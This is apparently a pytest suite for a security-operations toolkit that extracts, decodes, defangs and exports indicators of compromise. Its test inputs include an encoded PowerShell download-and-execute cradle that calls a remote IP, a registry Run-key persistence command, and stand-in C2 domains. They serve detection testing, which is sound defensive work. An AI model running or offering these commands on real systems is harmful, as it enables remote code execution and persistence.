import base64
import json

import pytest

from soc_toolkit.ioc import (
    IOC,
    Allowlist,
    IOCType,
    classify_ip,
    decode_base64,
    defang,
    extract,
    find_encoded,
    refang,
    to_csv,
    to_json,
    to_stix,
)


def values(found, kind):
    return [i.value for i in found if i.type.value == kind]


class TestRefangDefang:
    @pytest.mark.parametrize("raw, expected", [
        ("hxxps://evil[.]com/a", "https://evil.com/a"),
        ("hXXp[://]evil(.)com", "http://evil.com"),
        ("user[@]evil[dot]ru", "user@evil.ru"),
        ("1.2.3[.]4", "1.2.3.4"),
        ("fxp://files{.}evil.org", "ftp://files.evil.org"),
    ])
    def test_refang(self, raw, expected):
        assert refang(raw) == expected

    @pytest.mark.parametrize("raw, expected", [
        ("https://evil.example.com/path/a.b", "hxxps[://]evil[.]example[.]com/path/a.b"),
        ("1.2.3.4", "1[.]2[.]3[.]4"),
        ("user@evil.com", "user[@]evil[.]com"),
        ("2001:db8::1", "2001[:]db8[:][:]1"),
    ])
    def test_defang(self, raw, expected):
        assert defang(raw) == expected

    def test_roundtrip(self):
        url = "https://login.evil.com/a/b.php?x=1"
        assert refang(defang(url)) == url


class TestExtract:
    def test_defanged_input(self):
        found = extract("C2: hxxps://evil[.]example[.]com/a.exe и 185.220.101[.]45, user[@]corp-mail[.]ru")
        assert "https://evil.example.com/a.exe" in values(found, "url")
        assert "185.220.101.45" in values(found, "ipv4")
        assert "user@corp-mail.ru" in values(found, "email")
        assert "evil.example.com" in values(found, "domain")

    def test_ip_scopes(self):
        found = extract("10.0.0.5 192.168.1.1 8.8.8.8 127.0.0.1 169.254.1.1 100.64.0.1")
        scopes = {i.value: i.scope for i in found}
        assert scopes["10.0.0.5"] == "private"
        assert scopes["8.8.8.8"] == "public"
        assert scopes["127.0.0.1"] == "loopback"
        assert scopes["169.254.1.1"] == "link-local"
        assert values(extract("10.0.0.5 8.8.8.8", include_internal=False), "ipv4") == ["8.8.8.8"]

    def test_invalid_ip_and_versions_ignored(self):
        assert values(extract("999.1.1.1 1.2.3.4.5 version 10.0.19045.1"), "ipv4") == []

    def test_hashes(self):
        md5 = "44d88612fea8a8f36de82e1278abb02f"
        sha1 = "3395856ce81f2b7382dee72602f798b642f14140"
        sha256 = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
        found = extract(f"{md5} {sha1} {sha256.upper()} {sha256}")
        assert values(found, "md5") == [md5]
        assert values(found, "sha1") == [sha1]
        assert values(found, "sha256") == [sha256]
        assert next(i for i in found if i.type == IOCType.SHA256).count == 2

    def test_cve_and_mitre(self):
        found = extract("cve-2023-36884 и техника T1059.001, T1110")
        assert values(found, "cve") == ["CVE-2023-36884"]
        assert values(found, "mitre") == ["T1059.001", "T1110"]

    def test_files_are_not_domains(self):
        found = extract("Открыт invoice.docx и запущен payload.exe, лог в report.pdf")
        assert values(found, "domain") == []
        assert values(found, "filename") == ["payload.exe"]

    def test_windows_paths_and_registry(self):
        text = (r"run C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE now; "
                r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upd /d %APPDATA%\x\y.exe")
        found = extract(text)
        assert r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" in values(found, "path")
        assert r"%APPDATA%\x\y.exe" in values(found, "path")
        assert values(found, "registry") == [r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"]

    def test_ipv6_and_noise(self):
        found = extract("addr 2001:4860:4860::8888, time 12:30:45, mac aa:bb:cc:dd:ee:ff, std::vector, ::")
        assert values(found, "ipv6") == ["2001:4860:4860::8888"]

    def test_internal_domains(self):
        found = extract("dc01.corp.local evil.com")
        scopes = {i.value: i.scope for i in found if i.type == IOCType.DOMAIN}
        assert scopes == {"dc01.corp.local": "internal", "evil.com": ""}

    def test_email_domain_not_duplicated(self):
        found = extract("from attacker@evil.com")
        assert values(found, "domain") == []

    def test_types_filter(self):
        assert {i.type.value for i in extract("8.8.8.8 evil.com", types=["ipv4"])} == {"ipv4"}

    def test_context_and_count(self):
        found = extract("first 8.8.8.8 then again 8.8.8.8")
        ip = next(i for i in found if i.value == "8.8.8.8")
        assert ip.count == 2 and "first" in ip.context


class TestDecoding:
    def test_powershell_encoded_command(self):
        payload = "IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.156/a.ps1')"
        enc = base64.b64encode(payload.encode("utf-16-le")).decode()
        blobs = find_encoded(f"powershell.exe -nop -w hidden -enc {enc}")
        assert blobs[0].kind == "powershell" and blobs[0].decoded == payload
        found = extract(f"powershell -enc {enc}")
        ip = next(i for i in found if i.value == "45.33.32.156")
        assert {"decoded", "powershell"} <= ip.tags

    def test_plain_base64_and_nested(self):
        inner = base64.b64encode(b"connect to evil-c2.xyz now").decode()
        outer = base64.b64encode(f"stage: {inner}".encode()).decode()
        found = extract(outer)
        assert "evil-c2.xyz" in values(found, "domain")

    def test_no_decode_flag(self):
        enc = base64.b64encode(b"http://evil-c2.xyz/aaaa").decode()
        assert values(extract(enc, decode=False), "url") == []

    def test_binary_is_not_decoded(self):
        assert decode_base64(base64.b64encode(bytes(range(256))).decode()) is None

    def test_hashes_are_not_treated_as_base64(self):
        assert find_encoded("9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08") == []

    def test_url_encoded(self):
        found = extract("GET /redirect?u=https%3A%2F%2Fevil.example.com%2Flogin")
        assert "https://evil.example.com/login" in values(found, "url")


class TestAllowlist:
    def test_builtin(self):
        found = extract("https://login.microsoftonline.com/x 8.8.8.8 evil.com", allowlist=Allowlist.builtin())
        tags = {i.value: i.tags for i in found}
        assert "allowlisted" in tags["https://login.microsoftonline.com/x"]
        assert "allowlisted" in tags["8.8.8.8"]
        assert "allowlisted" not in tags["evil.com"]
        assert not next(i for i in found if i.value == "8.8.8.8").is_external

    def test_custom_cidr_and_hash(self, tmp_path):
        f = tmp_path / "al.yaml"
        f.write_text("ips: [203.0.113.0/24]\nhashes: [44D88612FEA8A8F36DE82E1278ABB02F]\ndomains: [corp.ru]\n")
        al = Allowlist.load([f])
        assert al.matches(IOC(IOCType.IPV4, "203.0.113.7"))
        assert al.matches(IOC(IOCType.MD5, "44d88612fea8a8f36de82e1278abb02f"))
        assert al.matches(IOC(IOCType.EMAIL, "a@mail.corp.ru"))
        assert not al.matches(IOC(IOCType.DOMAIN, "notcorp.ru"))


class TestExport:
    def test_csv(self):
        lines = to_csv(extract("8.8.8.8"), defanged=True).splitlines()
        assert lines[0] == "type,value,scope,tags,count,context"
        assert lines[1].startswith("ipv4,8[.]8[.]8[.]8,public")

    def test_json(self):
        assert json.loads(to_json(extract("evil.com")))[0]["value"] == "evil.com"

    def test_stix(self):
        bundle = json.loads(to_stix(extract("evil.com 1.2.3.4 44d88612fea8a8f36de82e1278abb02f CVE-2020-1234")))
        patterns = [o["pattern"] for o in bundle["objects"]]
        assert bundle["type"] == "bundle"
        assert "[domain-name:value = 'evil.com']" in patterns
        assert "[file:hashes.MD5 = '44d88612fea8a8f36de82e1278abb02f']" in patterns
        assert len(patterns) == 3  # CVE в STIX-индикаторы не попадает


def test_classify_ip_invalid():
    assert classify_ip("not-an-ip") == "invalid"
